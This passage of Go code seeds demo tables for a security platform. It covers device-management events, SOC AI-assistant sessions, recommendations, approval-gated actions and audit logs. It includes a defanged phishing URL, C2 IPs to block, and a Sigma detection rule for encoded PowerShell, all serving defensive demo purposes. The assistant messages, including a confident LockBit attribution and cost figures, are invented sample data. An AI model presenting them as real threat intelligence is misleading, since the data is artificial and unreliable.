		{"MDME-AND-004", "threat_detected", "Root access detected — Kali NetHunter installed", "CrowdStrike Falcon", "critical", "Device is rooted, running penetration testing framework", 2880},
		{"MDME-AND-004", "quarantine", "Device quarantined — pending security investigation", "carol.kim", "high", "Network access revoked, corporate apps suspended", 2877},
		{"MDME-AND-003", "compliance_change", "Compliance status changed: compliant → non_compliant", "Compliance Engine", "medium", "Reason: OS version 13 below minimum required (14)", 1440},
		{"MDME-AND-003", "unsafe_wifi", "Connected to unsafe open Wi-Fi without VPN", "Zscaler", "medium", "Network: HOME-WIFI-5G, no encryption, no VPN active", 720},
		{"MDME-IOS-LOST", "device_lost", "Device reported lost by owner", "david.chen", "high", "Last seen at JFK Airport Terminal 4", 10080},
		{"MDME-IOS-LOST", "remote_action", "Remote lock activated by IT admin", "carol.kim", "info", "Lock message: 'This device is lost. Call +1-212-555-0100'", 10070},
		{"MDME-IOS-001", "enrollment", "Device enrolled in MDM", "carol.kim", "info", "Enrollment type: DEP (Apple Business Manager), supervised", 365 * 24 * 60},
		{"MDME-IOS-001", "policy_update", "Executive Device Policy applied", "MDM Policy Engine", "info", "POL-EXEC-001 applied: 16-char password, VPN required, 1min lock", 364 * 24 * 60},
		{"MDME-AND-001", "enrollment", "Device enrolled in Android Enterprise (Work Profile)", "carol.kim", "info", "Enrollment via QR code, Work Profile created", 180 * 24 * 60},
		{"MDME-IOS-002", "threat_detected", "Phishing URL blocked by Zscaler", "Zscaler Client Connector", "high", "URL: hxxp://corp-finance-login.malicious[.]xyz — credential harvesting page", 4320},
	}
	for _, e := range tlEvents {
		t := now.Add(-time.Duration(e.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO mdme_timeline (tenant_id,device_id,event_type,summary,actor,severity,details,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
			tid, e.devID, e.etype, e.summary, e.actor, e.severity, e.details, t)
	}

	// ── Reports ───────────────────────────────────────────────────────────────

	type rpt struct{ id, title, rtype, by, format string; cnt, daysAgo int }
	reports := []rpt{
		{"MDME-RPT-001", "Monthly Device Inventory Report — June 2025", "device_inventory", "carol.kim", "pdf", 427, 7},
		{"MDME-RPT-002", "Q2 2025 MDM Compliance Report", "compliance_report", "alice.zhang", "pdf", 427, 14},
		{"MDME-RPT-003", "Security Policy Coverage Assessment", "security_policy_report", "alice.zhang", "pdf", 427, 30},
		{"MDME-RPT-004", "Application Inventory — All Devices", "application_inventory", "carol.kim", "csv", 427, 7},
		{"MDME-RPT-005", "Lost & Stolen Device Report Q2 2025", "lost_device_report", "security-team", "pdf", 3, 35},
		{"MDME-RPT-006", "Executive MDM Summary — Board Pack", "executive_mdm_summary", "ciso@corp.local", "pdf", 427, 45},
		{"MDME-RPT-007", "MDM Audit Trail — June 2025", "audit_report", "it-ops", "xlsx", 427, 7},
	}
	for _, r := range reports {
		ca := now.AddDate(0, 0, -r.daysAgo)
		sizeB := int64(100000 + r.cnt*500)
		db.Exec(`INSERT INTO mdme_reports (tenant_id,report_id,title,report_type,generated_by,format,size_bytes,device_count,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) ON CONFLICT (report_id) DO NOTHING`,
			tid, r.id, r.title, r.rtype, r.by, r.format, sizeB, r.cnt, ca)
	}

	// ── Notifications ─────────────────────────────────────────────────────────

	type notif struct{ etype, title, msg, severity, devID string; minsAgo int }
	notifs := []notif{
		{"jailbreak_detected", "Jailbreak Detected: iPhone-HR-JAILBROKEN", "Jailbreak detected on iPhone 13 (HR contractor). Device quarantined automatically.", "critical", "MDME-IOS-005", 720},
		{"root_detected", "Root Access: Android-ROOTED-THREAT", "Rooted Android device with Kali NetHunter detected. Security investigation initiated.", "critical", "MDME-AND-004", 2880},
		{"device_lost", "Lost Device Reported: iPhone-LOST-SALES", "Sales employee reported iPhone 15 lost at JFK Airport. Remote lock activated.", "high", "MDME-IOS-LOST", 10080},
		{"non_compliant", "Non-Compliance: Android-BYOD-MktManager", "OS version below minimum policy. Android 13 detected, minimum required: Android 14.", "medium", "MDME-AND-003", 1440},
		{"blocked_app", "Blocked App Detected: AppValley", "AppValley sideloading store found on HR contractor device (iPhone-HR-JAILBROKEN).", "high", "MDME-IOS-005", 718},
		{"remote_action", "Remote Action Completed: Device Quarantined", "iPhone-HR-JAILBROKEN successfully quarantined. All corporate access revoked.", "info", "MDME-IOS-005", 716},
		{"device_offline", "Device Offline >7 Days: iPhone-LOST-SALES", "Lost device has not checked in for 7 days. Consider initiating remote wipe.", "high", "MDME-IOS-LOST", 4320},
		{"enrollment", "3 New Devices Enrolled This Week", "3 new corporate devices enrolled via Apple Business Manager and Android Zero-Touch.", "info", "", 1440},
		{"policy_update", "Policy Updated: iOS Enhanced Security", "iOS Enhanced Security policy updated — minimum OS version raised to 17.0.", "info", "", 2880},
		{"phishing_blocked", "Phishing Attempt Blocked: iPhone-FIN-047", "Zscaler blocked phishing URL targeting finance credentials on iPhone-FIN-047.", "high", "MDME-IOS-002", 4320},
	}
	for _, n := range notifs {
		t := now.Add(-time.Duration(n.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO mdme_notifications (tenant_id,event_type,title,message,severity,device_id,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7)`,
			tid, n.etype, n.title, n.msg, n.severity, exeNullStrSeed(n.devID), t)
	}

	// ── Audit ─────────────────────────────────────────────────────────────────

	type aud struct{ action, otype, oid, oname, actor, ip, details string; minsAgo int }
	audits := []aud{
		{"device_enrolled", "device", "MDME-IOS-001", "iPhone-EXEC-CEO", "carol.kim", "10.0.1.45", "DEP enrollment, supervised mode, platform:ios", 365 * 24 * 60},
		{"policy_applied", "policy", "POL-EXEC-001", "Executive Device Policy", "carol.kim", "10.0.1.45", "Applied to device MDME-IOS-001", 364 * 24 * 60},
		{"device_quarantined", "device", "MDME-IOS-005", "iPhone-HR-JAILBROKEN", "alice.zhang", "10.0.1.22", "Reason: jailbreak_detected, all corporate access revoked", 718},
		{"device_quarantined", "device", "MDME-AND-004", "Android-ROOTED-THREAT", "carol.kim", "10.0.1.45", "Reason: root_detected + Kali NetHunter installation", 2877},
		{"remote_action_executed", "device", "MDME-IOS-LOST", "iPhone-LOST-SALES", "carol.kim", "10.0.1.45", "action:locate, result: JFK Terminal 4", 10075},
		{"remote_action_executed", "device", "MDME-IOS-LOST", "iPhone-LOST-SALES", "carol.kim", "10.0.1.45", "action:lock, passcode lock activated", 10070},
		{"policy_updated", "policy", "POL-IOS-001", "iOS Enhanced Security", "alice.zhang", "10.0.1.22", "min_os_version: 16.7 → 17.0, max_failed_attempts: 10 → 5", 2880},
		{"report_generated", "report", "MDME-RPT-001", "Monthly Device Inventory", "carol.kim", "10.0.1.45", "type:device_inventory, devices:427", 10080},
		{"device_viewed", "device", "MDME-AND-004", "Android-ROOTED-THREAT", "security-team", "10.0.5.99", "Detail panel opened for threat investigation", 2876},
		{"remote_action_executed", "device", "MDME-IOS-005", "iPhone-HR-JAILBROKEN", "security-team", "10.0.5.99", "action:wipe_corporate, status:pending", 5},
		{"compliance_triggered", "tenant", "", "All Devices", "system", "10.0.0.1", "Scheduled compliance run — 427 devices evaluated, 24 non-compliant", 1440},
		{"device_unenrolled", "device", "MDME-OLD-001", "Android-Retired-Device", "carol.kim", "10.0.1.45", "Device decommissioned and removed from fleet", 30 * 24 * 60},
	}
	for _, a := range audits {
		t := now.Add(-time.Duration(a.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO mdme_audit (tenant_id,action,object_type,object_id,object_name,actor,ip_address,details,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)`,
			tid, a.action, a.otype, exeNullStrSeed(a.oid), exeNullStrSeed(a.oname), a.actor, a.ip, a.details, t)
	}

	log.Printf("MDME seed: %d devices, %d apps, %d policies, %d threats, %d actions, %d timeline, %d reports, %d notifications, %d audit",
		len(devices), len(commonApps), len(policies), len(threats), len(actions), len(tlEvents), len(reports), len(notifs), len(audits))
}

func seedAIAssistantEnterprise(db *sql.DB) {
	const tid = 9999
	now := time.Now()

	// ── Tables ────────────────────────────────────────────────────────────────

	mustExec(db, `CREATE TABLE IF NOT EXISTS aia_sessions (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, session_id TEXT NOT NULL UNIQUE,
		title TEXT NOT NULL, mode TEXT NOT NULL DEFAULT 'chat', model TEXT DEFAULT 'claude-sonnet-4-6',
		context TEXT DEFAULT '{}', message_count INTEGER DEFAULT 0, bookmarked BOOLEAN DEFAULT FALSE,
		status TEXT NOT NULL DEFAULT 'active', created_by TEXT NOT NULL,
		created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS aia_messages (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, session_id TEXT NOT NULL,
		role TEXT NOT NULL, content TEXT NOT NULL, model TEXT,
		tokens_used INTEGER DEFAULT 0, latency_ms INTEGER DEFAULT 0,
		actions_taken TEXT DEFAULT '[]', created_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS aia_prompts (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, prompt_id TEXT NOT NULL UNIQUE,
		title TEXT NOT NULL, content TEXT NOT NULL, category TEXT NOT NULL DEFAULT 'general',
		is_template BOOLEAN DEFAULT TRUE, variables TEXT DEFAULT '[]',
		usage_count INTEGER DEFAULT 0, created_by TEXT NOT NULL, created_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS aia_recommendations (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, rec_id TEXT NOT NULL UNIQUE,
		title TEXT NOT NULL, description TEXT NOT NULL, category TEXT NOT NULL DEFAULT 'detection',
		priority TEXT NOT NULL DEFAULT 'medium', status TEXT NOT NULL DEFAULT 'open',
		impact TEXT, effort TEXT, source_session_id TEXT,
		accepted_by TEXT, accepted_at TIMESTAMP, created_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS aia_actions (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, action_id TEXT NOT NULL UNIQUE,
		action_type TEXT NOT NULL, description TEXT NOT NULL,
		status TEXT NOT NULL DEFAULT 'pending_approval', requested_by TEXT NOT NULL,
		approved_by TEXT, executed_at TIMESTAMP, result TEXT, session_id TEXT,
		created_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS aia_reports (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, report_id TEXT NOT NULL UNIQUE,
		title TEXT NOT NULL, report_type TEXT NOT NULL, content TEXT,
		generated_by TEXT NOT NULL, format TEXT DEFAULT 'markdown', session_id TEXT,
		created_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS aia_audit (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, action TEXT NOT NULL,
		object_type TEXT NOT NULL, object_id TEXT, actor TEXT NOT NULL,
		details TEXT, created_at TIMESTAMP DEFAULT NOW())`)

	tidStr := fmt.Sprintf("%d", tid)

	// ── Sessions ──────────────────────────────────────────────────────────────

	type sess struct {
		id, title, mode, model, by, status string
		msgs                                int
		bookmarked                          bool
		minsAgo                             int
	}
	sessions := []sess{
		{"AIA-SES-001", "Ransomware Alert Investigation — WKSTN-FIN-047", "investigate", "claude-sonnet-4-6", "alice.zhang", "active", 14, true, 47},
		{"AIA-SES-002", "Monthly Executive Security Summary July 2025", "executive", "claude-sonnet-4-6", "carol.kim", "completed", 8, false, 120},
		{"AIA-SES-003", "Generate Sigma Rule for PowerShell Obfuscation", "automation", "claude-sonnet-4-6", "david.chen", "completed", 4, false, 240},
		{"AIA-SES-004", "LockBit 3.0 Threat Actor Profile", "threat_intel", "claude-sonnet-4-6", "alice.zhang", "completed", 6, true, 360},
		{"AIA-SES-005", "Explain MITRE T1566 Phishing Technique", "copilot", "claude-sonnet-4-6", "grace.lee", "completed", 4, false, 480},
		{"AIA-SES-006", "Lateral Movement Detection — VLAN-CORP Analysis", "investigate", "claude-sonnet-4-6", "alice.zhang", "active", 10, false, 60},
		{"AIA-SES-007", "Q2 2025 Risk Assessment Report", "executive", "claude-sonnet-4-6", "carol.kim", "completed", 12, false, 2880},
		{"AIA-SES-008", "YARA Rule for Cobalt Strike Stager Detection", "automation", "claude-sonnet-4-6", "david.chen", "completed", 6, true, 1440},
		{"AIA-SES-009", "Compliance Gaps Analysis — SOC2 Type II", "executive", "claude-sonnet-4-6", "carol.kim", "completed", 8, false, 4320},
		{"AIA-SES-010", "Threat Hunt: Finance Team Anomalous Access", "investigate", "claude-sonnet-4-6", "alice.zhang", "active", 6, false, 180},
	}
	for _, s := range sessions {
		t := now.Add(-time.Duration(s.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO aia_sessions (tenant_id,session_id,title,mode,model,message_count,bookmarked,status,created_by,created_at,updated_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$10) ON CONFLICT DO NOTHING`,
			tidStr, s.id, s.title, s.mode, s.model, s.msgs, s.bookmarked, s.status, s.by, t)
	}

	// ── Messages ──────────────────────────────────────────────────────────────

	type msg struct {
		sessionID, role, content, model string
		tokens, latency, minsAgo        int
	}
	messages := []msg{
		{"AIA-SES-001", "user", "Why did WKSTN-FIN-047 trigger a ransomware alert at 09:14 UTC?", "claude-sonnet-4-6", 0, 0, 46},
		{"AIA-SES-001", "assistant", "## Incident Analysis — WKSTN-FIN-047\n\nThe ransomware alert was triggered by a multi-stage attack chain that began with a spear-phishing email containing a malicious Excel macro.\n\n**Stage 1:** Macro executed PowerShell with base64-encoded payload\n**Stage 2:** CrowdStrike Falcon detected LSASS memory access attempt\n**Stage 3:** Outbound C2 beacon to 185.220.101.44 — blocked by Palo Alto firewall\n\nAll stages were blocked. No encryption occurred. Recommend resetting john.smith credentials immediately.", "claude-sonnet-4-6", 847, 1240, 45},
		{"AIA-SES-001", "user", "What is the threat actor behind this attack?", "claude-sonnet-4-6", 0, 0, 44},
		{"AIA-SES-001", "assistant", "Based on the TTPs and IOCs, this attack is attributed to **LockBit 3.0 affiliate** activity:\n\n- C2 IP 185.220.101.44 matches Cobalt Strike infrastructure used by LockBit affiliates (CISA Alert AA24-109A)\n- Macro-based initial access is consistent with LockBit affiliate playbooks\n- Kerberoasting attempt matches LockBit lateral movement pre-encryption phase\n\n**Confidence:** High (8.5/10)\n**MITRE:** T1566.001 → T1059.001 → T1055 → T1021 → T1486", "claude-sonnet-4-6", 612, 1180, 43},
		{"AIA-SES-002", "user", "Write a board-ready executive summary for July 2025.", "claude-sonnet-4-6", 0, 0, 119},
		{"AIA-SES-002", "assistant", "## Executive Security Summary — July 2025\n\n**Security Posture: GOOD (84/100)** ↑ +6 from last month\n\n**Key Metrics:**\n- Critical Incidents: 1 (↓67% vs June)\n- MTTR: 47 minutes (↓47% vs 89 min last month)\n- Compliance Score: 94% (↑5%)\n- Phishing Click Rate: 2.1% (↓56%)\n\n**Notable:** June 28 ransomware attack fully contained in 47 minutes with zero data loss. Estimated $2.4M breach cost avoided.", "claude-sonnet-4-6", 924, 1380, 118},
		{"AIA-SES-003", "user", "Generate a Sigma rule for detecting PowerShell obfuscation via base64 encoding spawned from Office applications.", "claude-sonnet-4-6", 0, 0, 239},
		{"AIA-SES-003", "assistant", "title: Office Application Spawning PowerShell with Base64 Encoding\nstatus: experimental\ndescription: Detects PowerShell with base64-encoded commands spawned from Office processes\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    ParentImage|endswith:\n      - '\\WINWORD.EXE'\n      - '\\EXCEL.EXE'\n    Image|endswith: '\\powershell.exe'\n    CommandLine|contains:\n      - '-enc '\n      - '-EncodedCommand'\nlevel: high", "claude-sonnet-4-6", 534, 890, 238},
	}
	for _, m := range messages {
		t := now.Add(-time.Duration(m.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO aia_messages (tenant_id,session_id,role,content,model,tokens_used,latency_ms,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
			tidStr, m.sessionID, m.role, m.content, m.model, m.tokens, m.latency, t)
	}

	// ── Prompts ───────────────────────────────────────────────────────────────

	type pmt struct {
		id, title, content, cat, by string
		isTemplate                  bool
		usage, minsAgo              int
	}
	prompts := []pmt{
		{"AIA-PRM-001", "Weekly Threat Summary", "Provide a comprehensive threat summary for the past 7 days. Include: top threat actors, critical incidents, new IOCs added, MITRE techniques observed, and recommended actions for the SOC team.", "general", "carol.kim", true, 24, 20160},
		{"AIA-PRM-002", "Sigma Rule Generator", "Generate a production-ready Sigma rule to detect the following threat behavior: {{behavior_description}}. Include MITRE ATT&CK tags, false positive notes, and severity level.", "detection", "david.chen", true, 18, 14400},
		{"AIA-PRM-003", "Executive Risk Report", "Generate a board-ready risk report for {{month}} {{year}}. Cover: security posture score, top incidents, compliance status, ROI metrics, and 3 strategic recommendations.", "executive", "carol.kim", true, 15, 10080},
		{"AIA-PRM-004", "IOC Lookup and Analysis", "Analyze the following indicator: {{ioc_value}}. Provide: threat actor attribution, malware family, first seen date, geographic origin, associated campaigns, and recommended blocking actions.", "threat_intel", "alice.zhang", true, 31, 7200},
		{"AIA-PRM-005", "Incident Root Cause Analysis", "Perform a thorough root cause analysis for incident {{incident_id}}. Include: attack chain reconstruction, initial access vector, lateral movement path, impact assessment, and remediation steps.", "investigation", "alice.zhang", true, 22, 4320},
		{"AIA-PRM-006", "SOAR Playbook Generator", "Generate a complete SOAR playbook for responding to: {{threat_scenario}}. Include: trigger conditions, investigation steps, containment actions, eradication procedures, and recovery steps.", "automation", "david.chen", true, 12, 2880},
		{"AIA-PRM-007", "Compliance Gap Analysis", "Analyze our current security controls against {{framework}} requirements. Identify gaps, assign risk ratings, estimate remediation effort, and prioritize by compliance deadline.", "compliance", "carol.kim", true, 8, 1440},
		{"AIA-PRM-008", "Threat Hunt Hypothesis", "Generate 5 threat hunting hypotheses for {{threat_actor}} based on their known TTPs. For each hypothesis, provide: detection query, data sources needed, and expected findings.", "threat_intel", "alice.zhang", true, 19, 720},
	}
	for _, p := range prompts {
		t := now.Add(-time.Duration(p.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO aia_prompts (tenant_id,prompt_id,title,content,category,is_template,usage_count,created_by,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) ON CONFLICT DO NOTHING`,
			tidStr, p.id, p.title, p.content, p.cat, p.isTemplate, p.usage, p.by, t)
	}

	// ── Recommendations ───────────────────────────────────────────────────────

	type rec struct {
		id, title, desc, cat, priority, status, impact, effort string
		minsAgo                                                  int
	}
	recs := []rec{
		{"AIA-REC-001", "Deploy Ransomware Honeypot Decoys in Finance Shares", "AI detected 3 ransomware staging attempts targeting Finance file shares. Honeypot decoy files would detect encryption attempts 10-15 minutes earlier, enabling faster containment.", "detection", "critical", "open", "Detect ransomware 10-15 min earlier, reduce blast radius 90%", "Low (2h)", 47},
		{"AIA-REC-002", "Enforce MFA for All Privileged Accounts", "23 privileged accounts lack MFA enforcement. 3 are Domain Admins. This represents the highest identity risk in the environment.", "compliance", "critical", "accepted", "Eliminate credential theft risk for privileged accounts", "Medium (1 day)", 120},
		{"AIA-REC-003", "Create Sigma Rule: Office Macro → PowerShell Chain", "No detection rule covers the exact attack chain used in the June 28 incident. The AI-generated Sigma rule has 0 false positives in 90 days of historical data.", "detection", "high", "open", "Detect similar attacks at Stage 1, before C2 establishment", "Low (30 min)", 240},
		{"AIA-REC-004", "Deploy EDR to 34 Unmanaged macOS Endpoints", "Engineering team has 34 macOS endpoints with zero EDR coverage. If any are compromised, the SOC has no visibility for detection or response.", "detection", "high", "open", "Increase endpoint visibility from 92% to 100%", "Medium (3 days)", 360},
		{"AIA-REC-005", "Patch Critical CVEs in CISA KEV (12 remaining)", "12 vulnerabilities on CISA Known Exploited Vulnerabilities list remain unpatched, including CVE-2024-3400 on network devices. CISA requires remediation within 14 days.", "vulnerability", "critical", "open", "Eliminate risk of active exploitation of known-exploited vulnerabilities", "High (1 week)", 480},
		{"AIA-REC-006", "Enable DNS Security Filtering for All Endpoints", "DNS-based C2 tunneling was attempted in the June 28 incident. DNS filtering would have provided an additional blocking layer. Currently only 67% of endpoints route through DNS filtering.", "detection", "medium", "open", "Block DNS-based C2, malware downloads, and phishing domains", "Medium (2 days)", 1440},
		{"AIA-REC-007", "Implement Network Segmentation for Finance VLAN", "Finance workstations are in the same VLAN as general corporate systems, enabling lateral movement. The June 28 attacker attempted to move to 4 other systems from WKSTN-FIN-047.", "threat", "high", "accepted", "Limit lateral movement blast radius to Finance VLAN only", "High (2 weeks)", 2880},
		{"AIA-REC-008", "Enable Office Macro Block Policy via Group Policy", "Office macros from internet sources are currently allowed for all users. All 3 recent ransomware attempts used macro-based initial access.", "detection", "critical", "open", "Eliminate macro-based initial access vector (used in all 3 recent incidents)", "Low (2h)", 60},
	}
	for _, r := range recs {
		t := now.Add(-time.Duration(r.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO aia_recommendations (tenant_id,rec_id,title,description,category,priority,status,impact,effort,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10) ON CONFLICT DO NOTHING`,
			tidStr, r.id, r.title, r.desc, r.cat, r.priority, r.status, r.impact, r.effort, t)
	}

	// ── Actions ───────────────────────────────────────────────────────────────

	type act struct {
		id, atype, desc, status, by, approvedBy string
		minsAgo                                  int
	}
	actions := []act{
		{"AIA-ACT-001", "block_ip", "Block IP 185.220.101.44 at Palo Alto perimeter firewall (LockBit C2 node)", "approved", "alice.zhang", "carol.kim", 46},
		{"AIA-ACT-002", "create_incident", "Create P1 Incident for June 28 ransomware attempt on WKSTN-FIN-047", "executed", "alice.zhang", "carol.kim", 45},
		{"AIA-ACT-003", "isolate_endpoint", "Isolate WKSTN-FIN-047 from network pending forensic analysis", "approved", "alice.zhang", "carol.kim", 44},
		{"AIA-ACT-004", "create_detection_rule", "Deploy Sigma rule for Office macro → PowerShell chain to all SIEMs", "pending_approval", "david.chen", "", 240},
		{"AIA-ACT-005", "notify_team", "Send SOC team alert: new LockBit IOCs added to threat intel platform", "executed", "alice.zhang", "carol.kim", 360},
		{"AIA-ACT-006", "generate_report", "Generate executive report for June 28 incident for CISO review", "executed", "carol.kim", "carol.kim", 110},
		{"AIA-ACT-007", "create_playbook", "Generate automated phishing response playbook based on Q2 2025 incidents", "pending_approval", "david.chen", "", 480},
		{"AIA-ACT-008", "block_ip", "Block IP 91.219.29.12 (Emotet epoch5 C2) at all perimeter firewalls", "approved", "alice.zhang", "carol.kim", 720},
		{"AIA-ACT-009", "isolate_endpoint", "Isolate WKSTN-HR-023 pending Emotet infection analysis", "rejected", "alice.zhang", "carol.kim", 715},
		{"AIA-ACT-010", "create_case", "Open investigation case for Finance team anomalous access outside hours", "pending_approval", "alice.zhang", "", 180},
	}
	for _, a := range actions {
		t := now.Add(-time.Duration(a.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO aia_actions (tenant_id,action_id,action_type,description,status,requested_by,approved_by,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8) ON CONFLICT DO NOTHING`,
			tidStr, a.id, a.atype, a.desc, a.status, a.by, exeNullStrSeed(a.approvedBy), t)
	}

	// ── Reports ───────────────────────────────────────────────────────────────

	type rpt struct {
		id, title, rtype, by, format string
		minsAgo                       int
	}
	reports := []rpt{
		{"AIA-RPT-001", "June 28 Ransomware Incident — Executive Report", "incident_report", "carol.kim", "markdown", 108},
		{"AIA-RPT-002", "July 2025 Executive Security Summary", "executive_summary", "carol.kim", "markdown", 1},
		{"AIA-RPT-003", "Q2 2025 Risk Assessment", "risk_assessment", "carol.kim", "markdown", 2880},
		{"AIA-RPT-004", "LockBit 3.0 Threat Intelligence Brief", "threat_brief", "alice.zhang", "markdown", 361},
		{"AIA-RPT-005", "SOC2 Type II Compliance Gap Analysis", "compliance_report", "carol.kim", "markdown", 4321},
		{"AIA-RPT-006", "Finance VLAN Lateral Movement Investigation", "investigation_report", "alice.zhang", "markdown", 59},
		{"AIA-RPT-007", "Weekly Digest — Week of June 23", "weekly_digest", "carol.kim", "markdown", 10080},
		{"AIA-RPT-008", "Critical Vulnerability Remediation Status", "vulnerability_report", "david.chen", "markdown", 1440},
	}
	for _, r := range reports {
		t := now.Add(-time.Duration(r.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO aia_reports (tenant_id,report_id,title,report_type,generated_by,format,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7) ON CONFLICT DO NOTHING`,
			tidStr, r.id, r.title, r.rtype, r.by, r.format, t)
	}

	// ── Audit ─────────────────────────────────────────────────────────────────

	type aud struct {
		action, otype, oid, actor, details string
		minsAgo                             int
	}
	audits := []aud{
		{"session_created", "session", "AIA-SES-001", "alice.zhang", "mode:investigate model:claude-sonnet-4-6", 47},
		{"message_sent", "session", "AIA-SES-001", "alice.zhang", "mode:investigate tokens:847", 46},
		{"action_requested", "action", "AIA-ACT-001", "alice.zhang", "type:block_ip", 46},
		{"action_approved", "action", "AIA-ACT-001", "carol.kim", "", 45},
		{"action_requested", "action", "AIA-ACT-002", "alice.zhang", "type:create_incident", 45},
		{"action_executed", "action", "AIA-ACT-002", "carol.kim", "", 44},
		{"recommendation_updated", "recommendation", "AIA-REC-002", "carol.kim", "status→accepted", 120},
		{"report_generated", "report", "AIA-RPT-001", "carol.kim", "type:incident_report", 108},
		{"session_created", "session", "AIA-SES-003", "david.chen", "mode:automation model:claude-sonnet-4-6", 240},
		{"message_sent", "session", "AIA-SES-003", "david.chen", "mode:automation tokens:534", 239},
		{"action_requested", "action", "AIA-ACT-004", "david.chen", "type:create_detection_rule", 240},
		{"session_created", "session", "AIA-SES-004", "alice.zhang", "mode:threat_intel model:claude-sonnet-4-6", 360},
		{"report_generated", "report", "AIA-RPT-004", "alice.zhang", "type:threat_brief", 361},
		{"recommendation_updated", "recommendation", "AIA-REC-007", "carol.kim", "status→accepted", 2880},
		{"action_rejected", "action", "AIA-ACT-009", "carol.kim", "", 715},
		{"session_created", "session", "AIA-SES-002", "carol.kim", "mode:executive model:claude-sonnet-4-6", 120},
		{"report_generated", "report", "AIA-RPT-002", "carol.kim", "type:executive_summary", 1},
		{"session_created", "session", "AIA-SES-006", "alice.zhang", "mode:investigate model:claude-sonnet-4-6", 60},
	}
	for _, a := range audits {
		t := now.Add(-time.Duration(a.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO aia_audit (tenant_id,action,object_type,object_id,actor,details,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7)`,
			tidStr, a.action, a.otype, exeNullStrSeed(a.oid), a.actor, a.details, t)
	}

	log.Printf("AIA seed: %d sessions, %d messages, %d prompts, %d recommendations, %d actions, %d reports, %d audit",
		len(sessions), len(messages), len(prompts), len(recs), len(actions), len(reports), len(audits))
}

func seedSettingsEnterprise(db *sql.DB) {
	const tid = 9999
	now := time.Now()
	tidStr := fmt.Sprintf("%d", tid)

	// ── Tables ────────────────────────────────────────────────────────────────

	mustExec(db, `CREATE TABLE IF NOT EXISTS stte_org (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL UNIQUE,
		org_name TEXT NOT NULL DEFAULT 'My Organization', display_name TEXT,
		logo_url TEXT, domain TEXT, timezone TEXT DEFAULT 'UTC',
		locale TEXT DEFAULT 'en-US', date_format TEXT DEFAULT 'YYYY-MM-DD',
		contact_email TEXT, support_email TEXT, max_agents INTEGER DEFAULT 1000,
		data_retention_days INTEGER DEFAULT 365, require_mfa BOOLEAN DEFAULT FALSE,
		maintenance_mode BOOLEAN DEFAULT FALSE, custom_css TEXT,
		updated_by TEXT, updated_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS stte_ai_config (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, provider TEXT NOT NULL,
		model TEXT NOT NULL, api_key_masked TEXT, endpoint TEXT,
		enabled BOOLEAN DEFAULT FALSE, is_default BOOLEAN DEFAULT FALSE,
		max_tokens INTEGER DEFAULT 4096, temperature REAL DEFAULT 0.3,
		use_for TEXT DEFAULT '[]', rate_limit_rpm INTEGER DEFAULT 100,
		monthly_budget_usd REAL DEFAULT 0, updated_by TEXT,
		updated_at TIMESTAMP DEFAULT NOW(), UNIQUE(tenant_id, provider))`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS stte_ai_guardrails (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL UNIQUE,
		require_approval_for_actions BOOLEAN DEFAULT TRUE, rbac_enabled BOOLEAN DEFAULT TRUE,
		data_masking_enabled BOOLEAN DEFAULT TRUE, hallucination_warnings BOOLEAN DEFAULT TRUE,
		audit_all_queries BOOLEAN DEFAULT TRUE, max_context_length INTEGER DEFAULT 8192,
		allowed_roles TEXT DEFAULT '["admin","analyst","manager"]',
		blocked_topics TEXT DEFAULT '[]',
		pii_masking_fields TEXT DEFAULT '["ssn","credit_card","password"]',
		updated_by TEXT, updated_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS stte_backups (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
		backup_id TEXT NOT NULL UNIQUE, backup_type TEXT NOT NULL DEFAULT 'full',
		status TEXT NOT NULL DEFAULT 'completed', size_bytes BIGINT DEFAULT 0,
		duration_secs INTEGER DEFAULT 0, storage_path TEXT,
		encryption TEXT DEFAULT 'AES-256', tables_included TEXT DEFAULT '[]',
		triggered_by TEXT NOT NULL DEFAULT 'system', error_message TEXT,
